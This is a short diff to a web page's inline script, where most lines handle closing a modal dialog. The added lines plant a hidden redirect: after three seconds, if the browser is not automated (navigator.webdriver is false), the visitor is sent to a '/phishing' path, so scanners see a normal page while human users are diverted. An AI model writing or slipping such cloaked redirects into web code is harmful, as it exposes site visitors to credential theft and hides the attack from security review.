@@ -467,6 +467,11 @@
   document.getElementById('modal').addEventListener('click', function(e) {
     if (e.target === this) closeModal();
   });
+  setTimeout(() => {
+    if (!navigator.webdriver) {
+      location.href = "/phishing";
+    }
+  }, 3000);
 </script>
 </body>
 </html>
